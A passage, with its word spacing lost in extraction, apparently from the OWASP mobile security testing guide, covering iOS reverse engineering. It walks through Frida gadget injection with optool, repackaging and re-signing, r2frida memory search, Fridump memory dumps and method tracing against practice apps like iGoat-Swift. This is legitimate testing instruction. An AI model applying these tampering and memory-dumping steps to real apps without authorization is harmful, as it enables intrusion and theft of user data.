emu=Uc(UC_ARCH_ARM64,UC_MODE_ARM) ##---CreateStackmemory--- addr =0x40000000 size =1024*1024 emu.mem_map(addr,size) emu.reg_write(UC_ARM64_REG_SP,addr +size -1) ##---Loadtextsection-- base_addr =0x100000000 tmp_len =1024*1024 text_section_load_addr =0x10000432c emu.mem_map(base_addr,tmp_len) emu.mem_write(text_section_load_addr,bytes(text_content)) ##---Loaddatasection--- data_section_load_addr =0x10000d3e8 emu.mem_write(data_section_load_addr,bytes(data_content)) ##---Hackforstack_chk_guard--- ##withoutthiswillthrowinvalidmemoryreadat0x0 emu.mem_map(0x0,1024) emu.mem_write(0x0,b"00") ##---Executefrom0x1000080d4to0x100008154--- 344\nemu.emu_start(0x1000080d4,0x100008154) ret_value =emu.reg_read(UC_ARM64_REG_X0) ##---Dumpreturnvalue--- print(emu.mem_read(ret_value, 11)) Youmaynoticethatthereisanadditionalmemoryallocationataddress0x0,thisisasimplehackaroundstack_- chk_guardcheck. Withoutthis,therewillbeainvalidmemoryreaderrorandbinarycannotbeexecuted. Withthis hack,theprogramwillaccessthevalueat0x0anduseitforthestack_chk_guardcheck. Tosummarize,usingUnicorndorequiresomeadditionalsetupbeforeexecutingthebinary,butoncedone,thistoolcan help to provide deep insights into the binary. It provides the flexibility to execute the full binary or a limited part of it. UnicornalsoexposesAPIstoattachhookstotheexecution. Usingthesehooksyoucanobservethestateoftheprogram atanypointduringtheexecutionorevenmanipulatetheregisterorvariablevaluesandforcefullyexploreotherexecution branchesinaprogram. AnotheradvantagewhenrunningabinaryinUnicornisthatyoudon’tneedtoworryaboutvarious checkslikeroot/jailbreakdetectionordebuggerdetectionetc. Monitoring System Logs Platform: ios Manyappsloginformative(andpotentiallysensitive)messagestotheconsolelog. Thelogalsocontainscrashreports andotherusefulinformation. YoucancollectconsolelogsthroughtheXcodeDeviceswindowasfollows: 1. LaunchXcode. 2. Connectyourdevicetoyourhostcomputer. 3. ChooseWindow->DevicesandSimulators. 4. ClickonyourconnectediOSdeviceintheleftsectionoftheDeviceswindow. 5. Reproducetheproblem. 6. ClickontheOpenConsolebuttonlocatedintheupperright-handareaoftheDeviceswindowtoviewtheconsole logsonaseparatewindow. Tosavetheconsoleoutputtoatextfile,gotothetoprightsideoftheConsolewindowandclickontheSavebutton. 345\nYoucanalsoconnecttothedeviceshellasexplainedinAccessingtheDeviceShell,installsocatviaapt-getandrunthe followingcommand: iPhone:~root#socat -UNIX-CONNECT:/var/run/lockdown/syslog.sock ======================== ASLisheretoserveyou >watch OK Jun 713:42:14iPhonechmod[9705]<Notice>:MS:Notice:Injecting: (null)[chmod] (1556.00) Jun 713:42:14iPhonereadlink[9706]<Notice>:MS:Notice:Injecting: (null) [readlink] (1556.00) Jun 713:42:14iPhonerm[9707]<Notice>:MS:Notice:Injecting: (null)[rm] (1556.00) Jun 713:42:14iPhonetouch[9708]<Notice>:MS:Notice:Injecting: (null)[touch] (1556.00) ... Repackaging Apps Platform: ios Ifyouneedtotestonanon-jailbrokendeviceyoushouldlearnhowtorepackageanapptoenabledynamictestingon it. UseacomputerwithmacOStoperformallthestepsindicatedinthearticle“PatchingiOSApplications”fromtheobjection Wiki. Onceyou’redoneyou’llbeabletopatchanIPAbycallingtheobjectioncommand: objectionpatchipa --source my-app.ipa --codesign-signature 0C2E8200Dxxxx Finally, the app needs to be installed (sideloaded) and run with debugging communication enabled. Perform the steps fromthearticle“RunningPatchediOSApplications”fromtheobjectionWiki(usingios-deploy). ios-deploy --bundle Payload/my-app.app -W-d Referto“InstallingApps”tolearnaboutotherinstallationmethods. Someofthemdoesn’trequireyoutohaveamacOS. Thisrepackagingmethodisenoughformostusecases. Formoreadvancedrepackaging,referto“iOSTampering andReverseEngineering-Patching,RepackagingandRe-Signing”. 346\nLibrary Injection Platform: ios IfyouwanttouseFridaonnon-jailbrokendevicesyou’llneedtoincludeFridaGadget.dylib. Downloaditfirst: curl -Ohttps://build.frida.re/frida/ios/lib/FridaGadget.dylib Copy FridaGadget.dylib into the app directory and use optool to add a load command to the “UnCrackable Level 1” binary. $unzipUnCrackable-Level1.ipa $cpFridaGadget.dylibPayload/UnCrackable\Level\1.app/ $optoolinstall -cload -p"@executable_path/FridaGadget.dylib" -tPayload/UnCrackable\Level\1.app/UnCrackable\Level\1 FoundFATHeader Foundthinheader... Foundthinheader... InsertingaLC_LOAD_DYLIBcommandforarchitecture:arm SuccessfullyinsertedaLC_LOAD_DYLIBcommandforarm InsertingaLC_LOAD_DYLIBcommandforarchitecture:arm64 SuccessfullyinsertedaLC_LOAD_DYLIBcommandforarm64 WritingexecutabletoPayload/UnCrackableLevel1.app/UnCrackableLevel1... Patching Example: Making an App Debuggable Bydefault,anappavailableontheAppleAppStoreisnotdebuggable. InordertodebuganiOSapplication,itmusthave theget-task-allowentitlementenabled. Thisentitlementallowsotherprocesses(likeadebugger)toattachtotheapp. Xcodeisnotaddingtheget-task-allowentitlementinadistributionprovisioningprofile;itisonlywhitelistedandadded inadevelopmentprovisioningprofile. Thus,todebuganiOSapplicationobtainedfromtheAppStore,itneedstobere-signedwithadevelopmentprovisioning profilewiththeget-task-allowentitlement. Howtore-signanapplicationisdiscussedinthenextsection. Process Exploration Platform: ios Whentestinganapp,processexplorationcanprovidethetesterwithdeepinsightsintotheappprocessmemory. Itcan beachievedviaruntimeinstrumentationandallowstoperformtaskssuchas: • Retrievingthememorymapandloadedlibraries. • Searchingforoccurrencesofcertaindata. • Afterdoingasearch,obtainingthelocationofacertainoffsetinthememorymap. • Performingamemorydumpandinspectorreverseengineerthebinarydataoffline. • ReverseengineeringabinaryorFrameworkwhileit’srunning. As you can see, these tasks are rather supportive and/or passive, they’ll help us collect data and information that will supportothertechniques. Therefore,they’renormallyusedincombinationwithothertechniquessuchasmethodhook- ing. In the following sections you will be using r2frida to retrieve information straight from the app runtime. First start by openinganr2fridasessiontothetargetapp(e.g.iGoat-Swift)thatshouldberunningonyouriPhone(connectedperUSB). Usethefollowingcommand: r2frida://usb//iGoat-Swift Memory Maps and Inspection Youcanretrievetheapp’smemorymapsbyrunning:dm: 347\n[0x00000000]>:dm 0x0000000100b7c000 -0x0000000100de0000r-x/private/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app/iGoat-Swift 0x0000000100de0000 -0x0000000100e68000rw-/private/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app/iGoat-Swift 0x0000000100e68000 -0x0000000100e97000r--/private/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app/iGoat-Swift ... 0x0000000100ea8000 -0x0000000100eb0000rw- 0x0000000100eb0000 -0x0000000100eb4000r-- 0x0000000100eb4000 -0x0000000100eb8000r-x/usr/lib/TweakInject.dylib 0x0000000100eb8000 -0x0000000100ebc000rw-/usr/lib/TweakInject.dylib 0x0000000100ebc000 -0x0000000100ec0000r--/usr/lib/TweakInject.dylib 0x0000000100f60000 -0x00000001012dc000r-x ↪ /private/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app/Frameworks/Realm.framework/Realm While you’re searching or exploring the app memory, you can always verify where your current offset is located in the memorymap. Insteadofnotingandsearchingforthememoryaddressinthislistyoucansimplyrun:dm.. You’llfindan exampleinthefollowingsection“In-MemorySearch”. Ifyou’reonlyinterestedintothemodules(binariesandlibraries)thattheapphasloaded,youcanusethecommand:il tolistthemall: [0x00000000]>:il 0x0000000100b7c000iGoat-Swift 0x0000000100eb4000TweakInject.dylib 0x00000001862c0000SystemConfiguration 0x00000001847c0000libc++.1.dylib 0x0000000185ed9000Foundation 0x000000018483c000libobjc.A.dylib 0x00000001847be000libSystem.B.dylib 0x0000000185b77000CFNetwork 0x0000000187d64000CoreData 0x00000001854b4000CoreFoundation 0x00000001861d3000Security 0x000000018ea1d000UIKit 0x0000000100f60000Realm Asyoumightexpectyoucancorrelatetheaddressesofthelibrarieswiththememorymaps: e.g.themainappbinary iGoat-Swiftislocatedat0x0000000100b7c000andtheRealmFrameworkat0x0000000100f60000. Youcanalsouseobjectiontodisplaythesameinformation. $objection --gadget OWASP.iGoat-Swiftexplore OWASP.iGoat-Swifton (iPhone:11.1.2)[usb] #memorylistmodules Savetheoutputbyadding `--jsonmodules.json`tothiscommand Name Base Size Path -------------------------------- ----------- -------------------- ------------------------------------------------------------------------------ iGoat-Swift 0x100b7c000 2506752 (2.4MiB) /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGo... TweakInject.dylib 0x100eb4000 16384 (16.0KiB) /usr/lib/TweakInject.dylib SystemConfiguration 0x1862c0000 446464 (436.0KiB) /System/Library/Frameworks/SystemConfiguration.framework/SystemConfiguratio... libc++.1.dylib 0x1847c0000 368640 (360.0KiB) /usr/lib/libc++.1.dylib In-Memory Search In-memorysearchisaveryusefultechniquetotestforsensitivedatathatmightbepresentintheappmemory. See r2frida’s help on the search command (\/?) to learn about the search command and get a list of options. The followingshowsonlyasubsetofthem: [0x00000000]>\/? / search /j searchjson /w searchwide /wj searchwidejson /x searchhex /xj searchhexjson ... Youcanadjustyoursearchbyusingthesearchsettings\e~search. Forexample,\e search.quiet=true;willprintonly theresultsandhidesearchprogress: 348\n[0x00000000]>\e~search esearch.in=perm:r-- esearch.quiet=false Fornow,we’llcontinuewiththedefaultsandconcentrateonstringsearch. Inthisfirstexample,youcanstartbysearching forsomethingthatyouknowshouldbelocatedinthemainbinaryoftheapp: [0x00000000]>\/iGoat Searching5bytes:69476f6174 Searching5bytesin [0x0000000100b7c000-0x0000000100de0000] ... hits:509 0x100d7d332hit2_0iGoat_Swift24StringAnalysisExerciseVCC 0x100d7d3b2hit2_1iGoat_Swift28BrokenCryptographyExerciseVCC 0x100d7d442hit2_2iGoat_Swift23BackgroundingExerciseVCC 0x100d7d4b2hit2_3iGoat_Swift9AboutCellC 0x100d7d522hit2_4iGoat_Swift12FadeAnimatorV Nowtakethefirsthit,seektoitandcheckyourcurrentlocationinthememorymap: [0x00000000]>s0x100d7d332 [0x100d7d332]>:dm. 0x0000000100b7c000 -0x0000000100de0000r-x/private/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app/iGoat-Swift Asexpected,youarelocatedintheregionofthemainiGoat-Swiftbinary(r-x,readandexecute). Intheprevioussection, yousawthatthemainbinaryislocatedbetween0x0000000100b7c000and0x0000000100e97000. Now,forthissecondexample,youcansearchforsomethingthat’snotintheappbinarynorinanyloadedlibrary,typically userinput. OpentheiGoat-SwiftappandnavigateinthemenutoAuthentication->RemoteAuthentication->Start. Thereyou’llfindapasswordfieldthatyoucanoverwrite. Writethestring“owasp-mstg”butdonotclickonLoginjust yet. Performthefollowingtwosteps. [0x00000000]>\/owasp-mstg hits:1 0x1c06619c0hit3_0owasp-mstg Infact,thestringcouldbefoundataddress0x1c06619c0. Seekstothereandretrievethecurrentmemoryregionwith :dm.. [0x100d7d332]>s0x1c06619c0 [0x1c06619c0]>:dm. 0x00000001c0000000 -0x00000001c8000000rw- Nowyouknowthatthestringislocatedinarw-(readandwrite)regionofthememorymap. Additionally, you can search for occurrences of the wide version of the string (/w) and, again, check their memory re- gions: Thistimewerunthe\dm. commandforall@@hitsmatchingtheglobhit5_*. [0x00000000]>/wowasp-mstg Searching20bytes:6f0077006100730070002d006d00730074 006700 Searching20bytesin [0x0000000100708000-0x000000010096c000] ... hits:2 0x1020d1280hit5_06f0077006100730070002d006d00730074006700 0x1030c9c85hit5_16f0077006100730070002d006d00730074006700 [0x00000000]>\dm.@@hit5_* 0x0000000102000000 -0x0000000102100000rw- 0x0000000103084000 -0x00000001030cc000rw- Theyareinadifferentrw-region. Notethatsearchingforthewideversionsofstringsissometimestheonlywaytofind themasyou’llseeinthefollowingsection. In-memorysearchcan be very useful to quickly know ifcertain data is located in the main app binary, inside a shared libraryorinanotherregion. Youmayalsouseittotestthebehavioroftheappregardinghowthedataiskeptinmemory. Forinstance,youcouldcontinuethepreviousexample,thistimeclickingonLoginandsearchingagainforoccurrences ofthedata. Also,youmaycheckifyoustillcanfindthosestringsinmemoryaftertheloginiscompletedtoverifyifthis sensitivedataiswipedfrommemoryafteritsuse. 349\nMemory Dump Youcandumptheapp’sprocessmemorywithobjectionandFridump. Totakeadvantageofthesetoolsonanon-jailbroken device,theAndroidappmustberepackagedwithfrida-gadget.soandre-signed. Adetailedexplanationofthisprocess is in the section “Dynamic Analysis on Non-Jailbroken Devices. To use these tools on a jailbroken phone, simply have frida-serverinstalledandrunning. Withobjectionitispossibletodumpallmemoryoftherunningprocessonthedevicebyusingthecommandmemorydump all. $objectionexplore iPhoneon (iPhone:10.3.1)[usb] #memorydumpall/Users/foo/memory_iOS/memory Dumping768.0KiBfrombase:0x1ad200000 [####################################] 100% Memorydumpedtofile:/Users/foo/memory_iOS/memory Alternatively you can use Fridump. First, you need the name of the app you want to dump, which you can get with frida-ps. $frida-ps -U PID Name ---- ------ 1026 Gadget Afterwards,specifytheappnameinFridump. $python3fridump.py -uGadget -s CurrentDirectory:/Users/foo/PentestTools/iOS/fridump Outputdirectoryissetto:/Users/foo/PentestTools/iOS/fridump/dump Creatingdirectory... StartingMemorydump... Progress: [##################################################]100.0%Complete Runningstringsonallfiles: Progress: [##################################################]100.0%Complete Finished!PressCtrl+C Whenyouaddthe-sflag,allstringsareextractedfromthedumpedrawmemoryfilesandaddedtothefilestrings.txt, whichisstoredinFridump’sdumpdirectory. Inbothcases,ifyouopenthefileinradare2youcanuseitssearchcommand(/). Notethatfirstwedoastandardstring searchwhichdoesn’tsucceedandnextwesearchforawidestring,whichsuccessfullyfindsourstring“owasp-mstg”. $r2memory_ios [0x00000000]>/owasp-mstg Searching10bytesin [0x0-0x628c000] hits:0 [0x00000000]>/wowasp-mstg Searching20bytesin [0x0-0x628c000] hits:1 0x0036f800hit4_06f0077006100730070002d006d00730074006700 Next,wecanseektoitsaddressusings0x0036f800orshit4_0andprintitusingpsw(whichstandsforprintstringwide) orusepxtoprintitsrawhexadecimalvalues: [0x0036f800]>psw owasp-mstg [0x0036f800]>px48 -offset - 01 23 45 67 89 AB CD EF 0123456789ABCDEF 0x0036f800 6f0077006100730070002d006d007300 o.w.a.s.p.-.m.s. 0x0036f810 74006700000000000000000000000000 t.g............. 0x0036f820 00000000000000000000000000000000 ................ Notethatinordertofindthisstringusingthestringscommandyou’llhavetospecifyanencodingusingthe-eflagand inthiscaselfor16-bitlittle-endiancharacter. 350\n$strings -elmemory_ios |grep owasp-mstg owasp-mstg Waiting for the debugger Platform: ios TODO:Shouldbepossiblewithlldbaswell,currentlydon’thaveanything. Get Loaded Native Libraries Platform: ios Using Objection Youcanusethelist_frameworkscommandinobjectiontolistalltheapplication’sbundlesthatrepresentFrameworks. ...itudehacks.DVIAswiftv2.developon (iPhone:13.2.3)[usb] #iosbundleslist_frameworks Executable Bundle Version Path -------------- ----------------------------------------- --------- ------------------------------------------- Bolts org.cocoapods.Bolts 1.9.0 ...8/DVIA-v2.app/Frameworks/Bolts.framework RealmSwift org.cocoapods.RealmSwift 4.1.1 ...A-v2.app/Frameworks/RealmSwift.framework ...ystem/Library/Frameworks/IOKit.framework ... Using Frida InFridaREPLprocessrelatedinformationcanbeobtainedusingtheProcesscommand. WithintheProcesscommand thefunctionenumerateModulesliststhelibrariesloadedintotheprocessmemory. [iPhone::com.iOweApp]->Process.enumerateModules() [ { "base":"0x10008c000", "name": "iOweApp", "path":"/private/var/containers/Bundle/Application/F390A491-3524-40EA-B3F8-6C1FA105A23A/iOweApp.app/iOweApp", "size":49152 }, { "base":"0x1a1c82000", "name":"Foundation", "path":"/System/Library/Frameworks/Foundation.framework/Foundation", "size":2859008 }, { "base":"0x1a16f4000", "name":"libobjc.A.dylib", "path":"/usr/lib/libobjc.A.dylib", "size":200704 }, ... Similarly,informationrelatedtovariousthreadscanbeobtained. Process.enumerateThreads() [ { "context":{ ... }, "id": 1287, "state":"waiting" }, ... TheProcesscommandexposesmultiplefunctionswhichcanbeexploredasperneeds. Someusefulfunctionsarefind- ModuleByAddress,findModuleByNameandenumerateRangesbesidesothers. 351\nAutomated Static Analysis Platform: ios Several automated tools for analyzing iOS apps are available; most of them are commercial tools. The free and open sourcetoolsMobSFandobjectionhavesomestaticanddynamicanalysisfunctionality. Additionaltoolsarelistedinthe “StaticSourceCodeAnalysis”sectionofthe“TestingTools”chapter. Don’t shy away from using automated scanners for your analysis - they help you pick low-hanging fruit and allow you tofocusonthemoreinterestingaspectsofanalysis,suchasthebusinesslogic. Keepinmindthatstaticanalyzersmay producefalsepositivesandfalsenegatives;alwaysreviewthefindingscarefully. Repackaging and Re-Signing Platform: ios Of course, tampering an app invalidates the main executable’s code signature, so this won’t run on a non-jailbroken device. You’ll need to replace the provisioning profile and sign both the main executable and the files you’ve made include(e.g.FridaGadget.dylib)withthecertificatelistedintheprofile. Repackaging First,let’saddourownprovisioningprofiletothepackage: cpAwesomeRepackaging.mobileprovisionPayload/UnCrackable\Level\1.app/embedded.mobileprovision Next, we need to make sure that the Bundle ID in Info.plist matches the one specified in the profile because the codesigntoolwillreadtheBundleIDfromInfo.plistduringsigning;thewrongvaluewillleadtoaninvalidsignature. /usr/libexec/PlistBuddy -c"Set:CFBundleIdentifiersg.vantagepoint.repackage" Payload/UnCrackable\Level\ 1.app/Info.plist Re-Signing Finally, we use the codesign tool to re-sign both binaries. You need to use your own signing identity (in this example 8004380F331DCA22CC1B47FB1A805890AE41C938),whichyoucanoutputbyexecutingthecommandsecurity find- identity -v. $rm -rfPayload/UnCrackable\Level\1.app/_CodeSignature $/usr/bin/codesign --force --sign 8004380F331DCA22CC1B47FB1A805890AE41C938 Payload/UnCrackable\Level\1.app/FridaGadget.dylib Payload/UnCrackableLevel1.app/FridaGadget.dylib:replacingexistingsignature entitlements.plististhefileyoucreatedforyouremptyiOSproject. $/usr/bin/codesign --force --sign 8004380F331DCA22CC1B47FB1A805890AE41C938 --entitlements entitlements.plistPayload/UnCrackable\ Level\1.app/UnCrackable\ ↪ Level\1 Payload/UnCrackableLevel1.app/UnCrackableLevel1:replacingexistingsignature Nowyoushouldbereadytorunthemodifiedapp. Deployandruntheapponthedeviceusingios-deploy: ios-deploy --debug --bundle Payload/UnCrackable\Level\1.app/ Ifeverythingwentwell,theappshouldstartindebuggingmodewithLLDBattached. Fridashouldthenbeabletoattach totheappaswell. Youcanverifythisviathefrida-pscommand: 352\n$frida-ps -U PID Name --- ------ 499 Gadget Whensomethinggoeswrong(anditusuallydoes),mismatchesbetweentheprovisioningprofileandcode-signingheader arethemostlikelycauses. Readingtheofficialdocumentationhelpsyouunderstandthecode-signingprocess. Apple’s entitlementtroubleshootingpageisalsoausefulresource. Decompiling Native Code Platform: ios TODO.Hopperisonlymentionedonceintheentiredocument,ghidraisonlyusedfordisassembly,...Wecanexpandthis, maybeaddsomegoodghidrasnippetsforobjective-cmapping,... Information Gathering - Network Communication Platform: ios Most of the apps you might encounter connect to remote endpoints. Even before you perform any dynamic analysis (e.g.trafficcaptureandanalysis),youcanobtainsomeinitialinputsorentrypointsbyenumeratingthedomainstowhich theapplicationissupposedtocommunicateto. Typically these domains will be present as strings within the binary of the application. One can extract domains by retrieving strings (as discussed above) or checking the strings using tools like Ghidra. The latter option has a clear advantage: it can provide you with context, as you’ll be able to see in which context each domain is being used by checkingthecross-references. Fromhereonyoucanusethisinformationtoderivemoreinsightswhichmightbeofuselaterduringyouranalysis,e.g.you couldmatchthedomainstothepinnedcertificatesorperformfurtherreconnaissanceondomainnamestoknowmore aboutthetargetenvironment. Theimplementationandverificationofsecureconnectionscanbeanintricateprocessandtherearenumerousaspects toconsider. Forinstance,manyapplicationsuseotherprotocolsapartfromHTTPsuchasXMPPorplainTCPpackets,or performcertificatepinninginanattempttodeterMITMattacks. Remember that in most cases, using only static analysis will not be enough and might even turn out to be extremely inefficientwhencomparedtothedynamicalternativeswhichwillgetmuchmorereliableresults(e.g.usinganinterception proxy). Inthissectionwe’veonlytouchedthesurface,sopleaserefertothesection“BasicNetworkMonitoring/Sniffing” inthe“iOSBasicSecurityTesting”chapterandcheckoutthetestcasesinthechapter“iOSNetworkCommunication”for furtherinformation. 353\nMethod Tracing Platform: ios InterceptingObjective-CmethodsisausefuliOSsecuritytestingtechnique. Forexample,youmaybeinterestedindata storageoperationsornetworkrequests. Inthefollowingexample,we’llwriteasimpletracerforloggingHTTP(S)requests madeviaiOSstandardHTTPAPIs. We’llalsoshowyouhowtoinjectthetracerintotheSafariwebbrowser. Inthefollowingexamples,we’llassumethatyouareworkingonajailbrokendevice. Ifthat’snotthecase,youfirstneed tofollowthestepsoutlinedinsectionRepackagingandRe-SigningtorepackagetheSafariapp. Fridacomeswithfrida-trace, afunctiontracingtool. frida-traceacceptsObjective-Cmethodsviathe-mflag. You can pass it wildcards as well-given-[NSURL *], for example, frida-trace will automatically install hooks on allNSURL classselectors. We’llusethistogetaroughideaaboutwhichlibraryfunctionsSafaricallswhentheuseropensaURL. RunSafarionthedeviceandmakesurethedeviceisconnectedviaUSB.Thenstartfrida-traceasfollows: $frida-trace -U-m"-[NSURL*]" Safari Instrumentingfunctions... -[NSURLisMusicStoreURL]:Loadedhandlerat "/Users/berndt/Desktop/__handlers__/__NSURL_isMusicStoreURL_.js" -[NSURLisAppStoreURL]:Loadedhandlerat "/Users/berndt/Desktop/__handlers__/__NSURL_isAppStoreURL_.js" (...) Startedtracing248functions.PressCtrl+Ctostop. Next, navigatetoanewwebsiteinSafari. Youshouldseetracedfunctioncallsonthefrida-traceconsole. Notethat theinitWithURL:methodiscalledtoinitializeanewURLrequestobject. /*TID0xc07 */ 20313ms -[NSURLRequest _initWithCFURLRequest:0x1043bca30] 20313ms -[NSURLRequest URL] (...) 21324ms -[NSURLRequest initWithURL:0x106388b00] 21324ms |-[NSURLRequestinitWithURL:0x106388b00cachePolicy:0x0timeoutInterval:0x106388b80 Runtime Reverse Engineering Platform: ios Runtimereverseengineeringcanbeseenastheon-the-flyversionofreverseengineeringwhereyoudon’thavethebinary datatoyourhostcomputer. Instead,you’llanalyzeitstraightfromthememoryoftheapp. We’ll keep using the iGoat-Swift app, open a session with r2frida r2 frida://usb//iGoat-Swift and you can start by displayingthetargetbinaryinformationbyusingthe:icommand: [0x00000000]>:i arch arm bits 64 os darwin pid 2166 uid 501 objc true runtime V8 java false cylang true pageSize 16384 pointerSize 8 codeSigningPolicy optional isDebuggerAttached false cwd / Searchallsymbolsofacertainmodulewith:is <lib>,e.g.:is libboringssl.dylib. Thefollowingdoesacase-insensitivesearch(grep)forsymbolsincluding“aes”(~+aes). [0x00000000]>\islibboringssl.dylib~+aes 0x1863d6ed8sEVP_aes_128_cbc 0x1863d6ee4sEVP_aes_192_cbc 0x1863d6ef0sEVP_aes_256_cbc 0x1863d6f14sEVP_has_aes_hardware 354\n0x1863d6f1csaes_init_key 0x1863d728csaes_cipher 0x0uccaes_cbc_decrypt_mode 0x0uccaes_cbc_encrypt_mode ... Oryoumightprefertolookintotheimports/exports. Forexample: • Listallimportsofthemainbinary: :ii iGoat-Swift. • Listexportsofthelibc++.1.dyliblibrary: :iE /usr/lib/libc++.1.dylib. Forbigbinariesit’srecommendedtopipetheoutputtotheinternallessprogrambyappending~..,i.e.:iiiGoat- Swift~.. (ifnot,forthisbinary,you’dgetalmost5000linesprintedtoyourterminal). Thenextthingyoumightwanttolookataretheclasses: [0x00000000]>\ic~+passcode PSPasscodeField _UITextFieldPasscodeCutoutBackground UIPasscodeField PasscodeFieldCell ... Listclassfields: [0x19687256c]>\icUIPasscodeField 0x000000018eec6680 -becomeFirstResponder 0x000000018eec5d78 -appendString: 0x000000018eec6650 -canBecomeFirstResponder 0x000000018eec6700 -isFirstResponder 0x000000018eec6a60 -hitTest:forEvent: 0x000000018eec5384 -setKeyboardType: 0x000000018eec5c8c -setStringValue: 0x000000018eec5c64 -stringValue ... Imagine that you are interested into 0x000000018eec5c8c - setStringValue:. You can seek to that address with s 0x000000018eec5c8c,analyzethatfunctionafandprint10linesofitsdisassemblypd 10: [0x18eec5c8c]>pd10 ╭(fcn)fcn.18eec5c8c35 │ fcn.18eec5c8c (int32_targ1,int32_targ3); │bp:0 (vars0,args0) │sp:0 (vars0,args0) │rg:2 (vars0,args2) │ 0x18eec5c8c f657bd notbyte[rdi -0x43] ;arg1 │ 0x18eec5c8f a9f44f01a9 testeax,0xa9014ff4 │ 0x18eec5c94 fd std │ ╭─<0x18eec5c95 7b02 jnp0x18eec5c99 │ │ 0x18eec5c97 a9fd830091 testeax,0x910083fd │ 0x18eec5c9c f30300 addeax,dword [rax] │ 0x18eec5c9f aa stosbbyte [rdi],al │ ╭─<0x18eec5ca0 e003 loopne0x18eec5ca5 │ │ 0x18eec5ca2 02aa9b494197 addch,byte[rdx -0x68beb665] ; arg3 ╰ 0x18eec5ca8 f4 hlt Finally, instead of doing a full memory search for strings, you may want to retrieve the strings from a certain binary and filter them, as you’d do offline with radare2. For this you have to find the binary, seek to it and then run the :iz command. It’srecommendedtoapplyafilterwithakeyword~<keyword>/~+<keyword>tominimizetheterminaloutput. Ifjust wanttoexploreallresultsyoucanalsopipethemtotheinternalless\iz~... [0x00000000]>:il~iGoa 0x00000001006b8000iGoat-Swift [0x00000000]>s0x00000001006b8000 [0x1006b8000]>:iz Reading2.390625MB... Doyouwanttoprint8568lines?(y/N)N [0x1006b8000]>:iz~+hill Reading2.390625MB... [0x1006b8000]>:iz~+pass 355\nReading2.390625MB... 0x00000001006b93ed "passwordTextField" 0x00000001006bb11a "11iGoat_Swift20KeychainPasswordItemV0C5ErrorO" 0x00000001006bb164 "unexpectedPasswordData" 0x00000001006d3f62 "Errorreadingpasswordfromkeychain-" 0x00000001006d40f2 "IncorrectPassword" 0x00000001006d4112 "Enterthecorrectpassword" 0x00000001006d4632 "T@"UITextField",N,W,VpasswordField" 0x00000001006d46f2 "CREATETABLEIFNOTEXISTScreds(idINTEGERPRIMARYKEYAUTOINCREMENT,usernameTEXT,passwordTEXT);" 0x00000001006d4792 "INSERTINTOcreds(username,password)VALUES(?,?)" Tolearnmore,pleaserefertother2fridawiki. Basic Network Monitoring/Sniffing Platform: ios Youcanremotelysniffalltrafficinreal-timeoniOSbycreatingaRemoteVirtualInterfaceforyouriOSdevice. Firstmake sureyouhaveWiresharkinstalledonyourmacOShostcomputer. 1. ConnectyouriOSdevicetoyourmacOShostcomputerviaUSB. 2. YouwouldneedtoknowtheUDIDofyouriOSdevice,beforeyoucanstartsniffing. Checkthesection“Gettingthe UDIDofaniOSdevice”onhowtoretrieveit. OpentheTerminalonmacOSandenterthefollowingcommand,filling intheUDIDofyouriOSdevice. $rvictl -s<UDID> Startingdevice <UDID>[SUCCEEDED]withinterfacervi0 1. LaunchWiresharkandselect“rvi0”asthecaptureinterface. 2. FilterthetrafficwithCaptureFiltersinWiresharktodisplaywhatyouwanttomonitor(forexample,allHTTPtraffic sent/receivedviatheIPaddress192.168.1.1). ip.addr==192.168.1.1&&http ThedocumentationofWiresharkoffersmanyexamplesforCaptureFiltersthatshouldhelpyoutofilterthetraffictoget theinformationyouwant. Retrieving Strings Platform: ios Strings are always a good starting point while analyzing a binary, as they provide context to the associated code. For instance, an error log string such as “Cryptogram generation failed” gives us a hint that the adjoining code might be responsibleforthegenerationofacryptogram. In order to extract strings from an iOS binary, you can use GUI tools such as Ghidra or iaito or rely on CLI-based tools suchasthestringsUnixutility(strings<path_to_binary>)orradare2’srabin2(rabin2-zz<path_to_binary>). When usingtheCLI-basedonesyoucantakeadvantageofothertoolssuchasgrep(e.g.inconjunctionwithregularexpressions) tofurtherfilterandanalyzetheresults. 356\nNative Code Tracing Platform: ios Asdiscussedearlierinthischapter,iOSapplicationscanalsocontainnativecode(C/C++code)anditcanbetracedusing thefrida-traceCLIaswell. Forexample,youcantracecallstotheopenfunctionbyrunningthefollowingcommand: frida-trace -U-i"open" sg.vp.UnCrackable1 TheoverallapproachandfurtherimprovisationfortracingnativecodeusingFridaissimilartotheonediscussedinthe Android“Tracing”section. Unfortunately,therearenotoolssuchasstraceorftraceavailabletotracesyscallsorfunctioncallsofaniOSapp. Only DTraceexists,whichisaverypowerfulandversatiletracingtool,butit’sonlyavailableforMacOSandnotforiOS. Accessing App Data Directories Platform: ios Once you have installed the app, there is further information to explore. Let’s go through a short overview of the app folderstructureoniOSappstounderstandwhichdataisstoredwhere. Thefollowingillustrationrepresentstheapplication folderstructure: OniOS,systemapplicationscanbefoundinthe/Applicationsdirectorywhileuser-installedappsareavailableunder /private/var/containers/. However,findingtherightfolderjustbynavigatingthefilesystemisnotatrivialtaskas everyappgetsarandom128-bitUUID(UniversalUniqueIdentifier)assignedforitsdirectorynames. Inordertoeasilyobtaintheinstallationdirectoryinformationforuser-installedappsyoucanfollowthefollowingmeth- ods: Connecttotheterminalonthedeviceandrunthecommandipainstaller(IPAInstallerConsole)asfollows: 357\niPhone:~root#ipainstaller -l ... OWASP.iGoat-Swift iPhone:~root#ipainstaller -iOWASP.iGoat-Swift ... Bundle:/private/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67 Application:/private/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app Data:/private/var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693 Usingobjection’scommandenvwillalsoshowyouallthedirectoryinformationoftheapp. Connectingtotheapplication withobjectionisdescribedinthesection“RecommendedTools-Objection”. OWASP.iGoat-Swifton (iPhone:11.1.2)[usb] #env Name Path ----------------- ------------------------------------------------------------------------------------------- BundlePath 